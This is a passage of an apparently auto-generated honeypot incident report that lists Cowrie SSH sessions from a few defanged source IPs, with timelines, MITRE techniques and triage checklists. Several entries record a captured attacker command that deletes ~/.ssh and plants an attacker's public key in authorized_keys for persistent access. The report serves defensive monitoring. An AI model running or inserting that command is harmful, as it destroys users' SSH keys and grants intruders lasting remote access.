| **First Seen** | 2026-06-11 19:55 |
| **Last Seen** | 2026-06-11 19:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:55:13` | `cowrie.session.connect` |
| `2026-06-11 19:55:13` | `cowrie.client.version` |
| `2026-06-11 19:55:13` | `cowrie.client.kex` |
| `2026-06-11 19:55:14` | `cowrie.login.success` |
| `2026-06-11 19:55:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c93b7f459f1

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 19:57 |
| **Last Seen** | 2026-06-11 19:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:57:21` | `cowrie.session.connect` |
| `2026-06-11 19:57:21` | `cowrie.client.version` |
| `2026-06-11 19:57:21` | `cowrie.client.kex` |
| `2026-06-11 19:57:22` | `cowrie.login.success` |
| `2026-06-11 19:57:23` | `cowrie.session.params` |
| `2026-06-11 19:57:23` | `cowrie.command.input` |
| `2026-06-11 19:57:23` | `cowrie.command.failed` |
| `2026-06-11 19:57:24` | `cowrie.log.closed` |
| `2026-06-11 19:57:24` | `cowrie.session.params` |
| `2026-06-11 19:57:24` | `cowrie.command.input` |
| `2026-06-11 19:57:24` | `cowrie.session.file_download` |
| `2026-06-11 19:57:24` | `cowrie.log.closed` |
| `2026-06-11 19:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b88e0bfa3aac

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 19:57 |
| **Last Seen** | 2026-06-11 19:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:57:28` | `cowrie.session.connect` |
| `2026-06-11 19:57:28` | `cowrie.client.version` |
| `2026-06-11 19:57:28` | `cowrie.client.kex` |
| `2026-06-11 19:57:30` | `cowrie.login.success` |
| `2026-06-11 19:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d98a3382ebd2

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 20:03 |
| **Last Seen** | 2026-06-11 20:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:03:46` | `cowrie.session.connect` |
| `2026-06-11 20:03:46` | `cowrie.client.version` |
| `2026-06-11 20:03:46` | `cowrie.client.kex` |
| `2026-06-11 20:03:47` | `cowrie.login.success` |
| `2026-06-11 20:03:48` | `cowrie.session.params` |
| `2026-06-11 20:03:48` | `cowrie.command.input` |
| `2026-06-11 20:03:48` | `cowrie.command.failed` |
| `2026-06-11 20:03:49` | `cowrie.log.closed` |
| `2026-06-11 20:03:49` | `cowrie.session.params` |
| `2026-06-11 20:03:49` | `cowrie.command.input` |
| `2026-06-11 20:03:50` | `cowrie.session.file_download` |
| `2026-06-11 20:03:50` | `cowrie.log.closed` |
| `2026-06-11 20:03:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-152b244f1aad

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 20:03 |
| **Last Seen** | 2026-06-11 20:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:03:53` | `cowrie.session.connect` |
| `2026-06-11 20:03:53` | `cowrie.client.version` |
| `2026-06-11 20:03:54` | `cowrie.client.kex` |
| `2026-06-11 20:03:55` | `cowrie.login.success` |
| `2026-06-11 20:03:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e6ece2ea729

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:07 |
| **Last Seen** | 2026-06-11 20:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:07:45` | `cowrie.session.connect` |
| `2026-06-11 20:07:45` | `cowrie.client.version` |
| `2026-06-11 20:07:45` | `cowrie.client.kex` |
| `2026-06-11 20:07:46` | `cowrie.login.success` |
| `2026-06-11 20:07:46` | `cowrie.session.params` |
| `2026-06-11 20:07:46` | `cowrie.command.input` |
| `2026-06-11 20:07:46` | `cowrie.command.failed` |
| `2026-06-11 20:07:46` | `cowrie.log.closed` |
| `2026-06-11 20:07:47` | `cowrie.session.params` |
| `2026-06-11 20:07:47` | `cowrie.command.input` |
| `2026-06-11 20:07:47` | `cowrie.session.file_download` |
| `2026-06-11 20:07:47` | `cowrie.log.closed` |
| `2026-06-11 20:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fe7524d64bc

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:07 |
| **Last Seen** | 2026-06-11 20:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:07:49` | `cowrie.session.connect` |
| `2026-06-11 20:07:49` | `cowrie.client.version` |
| `2026-06-11 20:07:49` | `cowrie.client.kex` |
| `2026-06-11 20:07:50` | `cowrie.login.success` |
| `2026-06-11 20:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15cf3d7bdda7

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:09 |
| **Last Seen** | 2026-06-11 20:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:09:46` | `cowrie.session.connect` |
| `2026-06-11 20:09:46` | `cowrie.client.version` |
| `2026-06-11 20:09:46` | `cowrie.client.kex` |
| `2026-06-11 20:09:47` | `cowrie.login.success` |
| `2026-06-11 20:09:47` | `cowrie.session.params` |
| `2026-06-11 20:09:47` | `cowrie.command.input` |
| `2026-06-11 20:09:47` | `cowrie.command.failed` |
| `2026-06-11 20:09:47` | `cowrie.log.closed` |
| `2026-06-11 20:09:48` | `cowrie.session.params` |
| `2026-06-11 20:09:48` | `cowrie.command.input` |
| `2026-06-11 20:09:48` | `cowrie.session.file_download` |
| `2026-06-11 20:09:48` | `cowrie.log.closed` |
| `2026-06-11 20:09:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-168a2df2dac5

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:09 |
| **Last Seen** | 2026-06-11 20:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:09:50` | `cowrie.session.connect` |
| `2026-06-11 20:09:50` | `cowrie.client.version` |
| `2026-06-11 20:09:50` | `cowrie.client.kex` |
| `2026-06-11 20:09:51` | `cowrie.login.success` |
| `2026-06-11 20:09:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a67854a25ea6

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 20:10 |
| **Last Seen** | 2026-06-11 20:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:10:00` | `cowrie.session.connect` |
| `2026-06-11 20:10:00` | `cowrie.client.version` |
| `2026-06-11 20:10:00` | `cowrie.client.kex` |
| `2026-06-11 20:10:02` | `cowrie.login.success` |
| `2026-06-11 20:10:02` | `cowrie.session.params` |
| `2026-06-11 20:10:02` | `cowrie.command.input` |
| `2026-06-11 20:10:02` | `cowrie.command.failed` |
| `2026-06-11 20:10:03` | `cowrie.log.closed` |
| `2026-06-11 20:10:03` | `cowrie.session.params` |
| `2026-06-11 20:10:03` | `cowrie.command.input` |
| `2026-06-11 20:10:04` | `cowrie.session.file_download` |
| `2026-06-11 20:10:04` | `cowrie.log.closed` |
| `2026-06-11 20:10:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c72bb38c19e6

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 20:10 |
| **Last Seen** | 2026-06-11 20:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:10:07` | `cowrie.session.connect` |
| `2026-06-11 20:10:07` | `cowrie.client.version` |
| `2026-06-11 20:10:08` | `cowrie.client.kex` |
| `2026-06-11 20:10:09` | `cowrie.login.success` |
| `2026-06-11 20:10:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e9ce0473964

| Field | Detail |
|---|---|
| **Source IP** | `122.168.194[.]41` |
| **First Seen** | 2026-06-11 20:10 |
| **Last Seen** | 2026-06-11 20:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:10:20` | `cowrie.session.connect` |
| `2026-06-11 20:10:20` | `cowrie.client.version` |
| `2026-06-11 20:10:20` | `cowrie.client.kex` |
| `2026-06-11 20:10:20` | `cowrie.login.success` |
| `2026-06-11 20:10:21` | `cowrie.session.params` |
| `2026-06-11 20:10:21` | `cowrie.command.input` |
| `2026-06-11 20:10:21` | `cowrie.command.failed` |
| `2026-06-11 20:10:21` | `cowrie.log.closed` |
| `2026-06-11 20:10:21` | `cowrie.session.params` |
| `2026-06-11 20:10:21` | `cowrie.command.input` |
| `2026-06-11 20:10:21` | `cowrie.session.file_download` |
| `2026-06-11 20:10:21` | `cowrie.log.closed` |
| `2026-06-11 20:10:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.194[.]41` to AbuseIPDB if not already reported
- [ ] Block `122.168.194[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-620e16692173

| Field | Detail |
|---|---|
| **Source IP** | `122.168.194[.]41` |
| **First Seen** | 2026-06-11 20:10 |
| **Last Seen** | 2026-06-11 20:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:10:22` | `cowrie.session.connect` |
| `2026-06-11 20:10:22` | `cowrie.client.version` |
| `2026-06-11 20:10:22` | `cowrie.client.kex` |
| `2026-06-11 20:10:23` | `cowrie.login.success` |
| `2026-06-11 20:10:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.194[.]41` to AbuseIPDB if not already reported
- [ ] Block `122.168.194[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c768695c8c8e

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:11 |
| **Last Seen** | 2026-06-11 20:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:11:40` | `cowrie.session.connect` |
| `2026-06-11 20:11:40` | `cowrie.client.version` |
| `2026-06-11 20:11:41` | `cowrie.client.kex` |
| `2026-06-11 20:11:41` | `cowrie.login.success` |
| `2026-06-11 20:11:42` | `cowrie.session.params` |
| `2026-06-11 20:11:42` | `cowrie.command.input` |
| `2026-06-11 20:11:42` | `cowrie.command.failed` |
| `2026-06-11 20:11:42` | `cowrie.log.closed` |
| `2026-06-11 20:11:42` | `cowrie.session.params` |
| `2026-06-11 20:11:42` | `cowrie.command.input` |
| `2026-06-11 20:11:43` | `cowrie.session.file_download` |
| `2026-06-11 20:11:43` | `cowrie.log.closed` |
| `2026-06-11 20:11:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98582d92cb7f

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:11 |
| **Last Seen** | 2026-06-11 20:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:11:45` | `cowrie.session.connect` |
| `2026-06-11 20:11:45` | `cowrie.client.version` |
| `2026-06-11 20:11:45` | `cowrie.client.kex` |
| `2026-06-11 20:11:46` | `cowrie.login.success` |
| `2026-06-11 20:11:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dfd7daf57e8

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 20:14 |
| **Last Seen** | 2026-06-11 20:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:14:19` | `cowrie.session.connect` |
| `2026-06-11 20:14:19` | `cowrie.client.version` |
| `2026-06-11 20:14:19` | `cowrie.client.kex` |
| `2026-06-11 20:14:20` | `cowrie.login.success` |
| `2026-06-11 20:14:21` | `cowrie.session.params` |
| `2026-06-11 20:14:21` | `cowrie.command.input` |
| `2026-06-11 20:14:21` | `cowrie.command.failed` |
| `2026-06-11 20:14:22` | `cowrie.log.closed` |
| `2026-06-11 20:14:22` | `cowrie.session.params` |
| `2026-06-11 20:14:22` | `cowrie.command.input` |
| `2026-06-11 20:14:23` | `cowrie.session.file_download` |
| `2026-06-11 20:14:23` | `cowrie.log.closed` |
| `2026-06-11 20:14:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c41e5c768d98

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 20:14 |
| **Last Seen** | 2026-06-11 20:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:14:26` | `cowrie.session.connect` |
| `2026-06-11 20:14:26` | `cowrie.client.version` |
| `2026-06-11 20:14:27` | `cowrie.client.kex` |
| `2026-06-11 20:14:28` | `cowrie.login.success` |
| `2026-06-11 20:14:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-275a48d2af24

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:15 |
| **Last Seen** | 2026-06-11 20:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
